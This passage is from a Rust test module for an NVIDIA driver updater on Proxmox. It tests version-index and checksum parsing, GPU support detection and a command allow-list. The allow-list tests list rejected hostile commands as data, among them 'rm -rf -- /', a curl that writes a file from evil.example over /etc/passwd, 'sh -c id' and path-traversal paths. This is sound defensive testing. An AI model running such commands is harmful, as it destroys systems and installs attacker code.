        assert!(!plain.allows_write(Path::new(NOUVEAU_CONF), NOUVEAU_BODY.as_bytes()));
        assert!(Grant::fresh("595.120.01", "6.17.13-2-pve", "open", vec![], vec![]).unwrap().allows_write(Path::new(NOUVEAU_CONF), NOUVEAU_BODY.as_bytes()));
    }

    const HTML: &str = "<html><body><a href='../'>../</a>\n<span class='dir'><a href='590.48.01/'>590.48.01/</a></span>\n<span class='dir'><a href='595.58.03/'>595.58.03/</a></span>\n<span class='dir'><a href='595.80/'>595.80/</a></span>\n<span class='dir'><a href='595.112.07/'>595.112.07/</a></span>\n<span class='dir'><a href='596.10.01/'>596.10.01/</a></span>\n<a href='latest.txt'>latest.txt</a>\n<a href='1.0-9746/'>x</a>\n<a href=\"595.112.07/\">dup double quotes</a></body></html>";

    #[test]
    fn a_gpu_ct_without_libs_gets_an_explicit_line_with_the_reason() {
        assert_eq!(skipped_libs_line(129, "llama-swap", true), "CT 129 (llama-swap): no libraries (already at the target version)");
        assert_eq!(skipped_libs_line(120, "", false), "CT 120: no libraries (CT is stopped and its libs version is unknown)");
    }

    #[test]
    fn index_lists_numeric_version_dirs_sorted_and_deduped() {
        let v = parse_index(HTML);
        assert_eq!(v, ["590.48.01", "595.58.03", "595.80", "595.112.07", "596.10.01"]);
    }

    #[test]
    fn index_parses_a_literal_fragment_of_the_real_nvidia_page() {
        // Fragmento literal de https://download.nvidia.com/XFree86/Linux-x86_64/ (curl, 2026-11-09): comillas simples.
        let real = "      <span class='dir'><a href='595.45.04/'>595.45.04/</a></span>\n      <span class='dir'><a href='595.58.03/'>595.58.03/</a></span>\n      <span class='dir'><a href='595.84/'>595.84/</a></span>\n      <span class='dir'><a href='595.91.07/'>595.91.07/</a></span>\n      <span class='dir'><a href='595.99.02/'>595.99.02/</a></span>\n      <span class='dir'><a href='595.104.02/'>595.104.02/</a></span>\n      <span class='dir'><a href='595.112.07/'>595.112.07/</a></span>\n";
        let v = parse_index(real);
        assert_eq!(v.len(), 7);
        assert_eq!(newest_in_branch(&v, "595.45.04").as_deref(), Some("595.112.07"));
    }

    #[test]
    fn sha_parses_the_real_two_space_format() {
        let real = "8c0d4f967b7932c4ab5714272aee8103392b0a702c92afa555176d36205829f9  NVIDIA-Linux-x86_64-595.58.03.run\n";
        assert_eq!(parse_sha(real, "NVIDIA-Linux-x86_64-595.58.03.run").as_deref(), Some("8c0d4f967b7932c4ab5714272aee8103392b0a702c92afa555176d36205829f9"));
    }

    #[test]
    fn newest_major_picks_the_best_version_of_the_highest_supported_newer_branch() {
        let v: Vec<String> = ["590.48.01", "595.58.03", "595.112.07", "600.10.01", "600.12.01", "610.1.02"].iter().map(|s| s.to_string()).collect();
        assert_eq!(newest_major(&v, "610.1.02", |_| true), None, "no branch above the current one");
        assert_eq!(newest_major(&v, "garbage", |_| true), None);
        assert_eq!(newest_major(&v, "595.58.03", |_| true).as_deref(), Some("610.1.02"), "the highest branch wins");
        assert_eq!(newest_major(&v, "590.48.01", |x| x.starts_with("600")).as_deref(), Some("600.12.01"), "the newest branch that lists the GPU, and its best version");
        assert_eq!(newest_major(&v, "595.58.03", |_| false), None, "the GPU is not supported by any newer branch");
        assert_eq!(newest_major(&v, "595.58.03", |x| x.starts_with("595")), None, "the same branch is not a jump");
    }

    #[test]
    fn newest_stays_inside_the_same_major_branch() {
        let v = parse_index(HTML);
        assert_eq!(newest_in_branch(&v, "595.58.03").as_deref(), Some("595.112.07"));
        assert_eq!(newest_in_branch(&v, "595.112.07"), None, "already the newest of 595.x (596 is another branch)");
        assert_eq!(newest_in_branch(&v, "590.48.01"), None);
        assert_eq!(newest_in_branch(&v, "garbage"), None);
        // 2 tramos contra 3: 595.80 < 595.112.07 (numérico, no de texto)
        assert_eq!(version_cmp("595.80", "595.112.07"), Ordering::Less);
    }

    #[test]
    fn sha_file_must_name_the_expected_run() {
        let h = "a".repeat(64);
        assert_eq!(parse_sha(&format!("{h}  NVIDIA-Linux-x86_64-1.2.run\n"), "NVIDIA-Linux-x86_64-1.2.run"), Some(h.clone()));
        assert_eq!(parse_sha(&format!("{h}  other.run"), "NVIDIA-Linux-x86_64-1.2.run"), None);
        assert_eq!(parse_sha("zz  NVIDIA-Linux-x86_64-1.2.run", "NVIDIA-Linux-x86_64-1.2.run"), None);
        assert_eq!(parse_sha("", "x"), None);
    }

    #[test]
    fn flavor_follows_the_loaded_module() {
        assert_eq!(flavor_of("NVRM version: NVIDIA UNIX Open Kernel Module for x86_64  595.112.07"), "open");
        assert_eq!(flavor_of("NVRM version: NVIDIA UNIX x86_64 Kernel Module  595.112.07"), "proprietary");
    }

    #[test]
    fn grant_only_allows_its_exact_commands() {
        let g = Grant::new("595.120.01", "6.17.9-1-pve", "proprietary", vec![134], vec![134]).unwrap();
        for f in g.fixed() {
            assert!(is_host_argv(&argv(&f), &g), "{f:?}");
        }
        let d = format!("{CT_DIR_PREFIX}Ab3dE9xZ");
        assert!(is_host_argv(&argv(&g.ct_push(134, &d)), &g));
        assert!(!is_host_argv(&argv(&g.ct_push(999, &d)), &g), "other CT");
        for bad in ["/var/tmp/pxu-nvidia.run", "/var/tmp/pxu-nvidia.Ab3dE9xZ", "/var/lib/pxu-nvidia.short", "/var/lib/pxu-nvidia.Ab3dE9xZ/../x", "/var/lib/pxu-nvidia.Ab3dE9x/", "/etc"] {
            assert!(!is_host_argv(&argv(&g.ct_push(134, bad)), &g), "{bad}");
            assert!(!is_guest_argv(&argv(&ct_libs_argv(bad)), 134, &g), "{bad}");
            assert!(!is_guest_argv(&argv(&ct_rm(bad)), 134, &g), "{bad}");
            assert!(!ct_dir_ok(bad), "{bad}");
        }
        assert!(!is_host_argv(&["pct", "stop", "999"], &g));
        assert!(!is_host_argv(&["sh", "/var/lib/pxu-nvidia/other.run", "--check"], &g), "other version/file");
        assert!(!is_host_argv(&["modprobe", "-r", "nvidia", "--force"], &g));
        assert!(!is_host_argv(&["rm", "-rf", "--", "/"], &g));
        assert!(!is_host_argv(&["rm", "-rf", "--", "/var/tmp"], &g));
        assert!(!is_host_argv(&["curl", "-o", "/etc/passwd", "https://evil.example/x.run"], &g));
        let libs_v = ct_libs_argv(&d);
        let libs = argv(&libs_v);
        assert!(is_guest_argv(&libs, 134, &g) && !is_guest_argv(&libs, 135, &g));
        assert!(is_guest_argv(CT_MKTEMP, 134, &g) && is_guest_argv(&argv(&ct_sha(&d)), 134, &g) && is_guest_argv(&argv(&ct_rm(&d)), 134, &g));
        assert!(!is_guest_argv(&["rm", "-rf", "--", "/var/lib"], 134, &g));
        assert!(!is_guest_argv(&["sh", "-c", "id"], 134, &g));
        assert!(Grant::new("../../x", "6.1", "open", vec![], vec![]).is_none());
        assert!(Grant::new("595.1.2", "6.1/../x", "open", vec![], vec![]).is_none());
        assert!(Grant::new("595.1.2", "6.1", "weird", vec![], vec![]).is_none());
    }

    /// Fragmento con la forma de la página real: filas `devidXXXX`, con subsistema y la sección legacy.
    const CHIPS: &str = "<table><tr id=\"devid24B0\"><td>RTX A4000</td><td>24B0</td></tr>\n<tr id=\"devid1FF2_10DE_18FF\"><td>T400</td></tr>\n<tr id='devid24b0_1028_14ad'><td>A4000</td></tr></table>\n<h3>Legacy GPUs that are no longer supported</h3>\n<tr id=\"devid1CB1\"><td>Quadro P1000</td></tr>";

    #[test]
    fn supportedchips_rows_with_and_without_subsystem_are_read_up_to_the_legacy_section() {
        let ids = parse_supported_ids(CHIPS);
        assert_eq!(ids.iter().map(String::as_str).collect::<Vec<_>>(), ["1FF2", "24B0"]);
        assert!(!ids.contains("1CB1"), "a GPU only in the legacy section is not supported");
        assert!(parse_supported_ids("").is_empty() && parse_supported_ids("<html>404</html>").is_empty());
    }

    #[test]
    fn host_ids_are_the_video_controllers_only() {
        let l = "01:00.0 VGA compatible controller [0300]: NVIDIA Corporation GA104GL [RTX A4000] [10de:24b0] (rev a1)\n01:00.1 Audio device [0403]: NVIDIA Corporation GA104 High Definition Audio Controller [10de:228b] (rev a1)\n02:00.0 3D controller [0302]: NVIDIA Corporation GA100 [10de:20B5]\nc5:00.0 Display controller [0380]: Advanced Micro Devices, Inc. [AMD/ATI] Phoenix3 [1002:1900]\n";
        assert_eq!(host_nvidia_ids(l), ["24B0", "20B5"]);
        assert!(host_nvidia_ids("").is_empty());
    }

    #[test]
    fn the_chips_page_is_fetched_for_the_exact_version_and_is_on_the_allow_list() {
        let g = Grant::new("595.112.07", "6.17.13-2-pve", "open", vec![], vec![]).unwrap();
        assert_eq!(chips_url("595.112.07"), "https://download.nvidia.com/XFree86/Linux-x86_64/595.112.07/README/supportedchips.html");
        let c = g.fetch_chips();
        assert!(is_host_argv(&c.iter().map(String::as_str).collect::<Vec<_>>(), &g));
        assert_eq!(c.last().map(String::as_str), Some(chips_url("595.112.07").as_str()));
    }
}
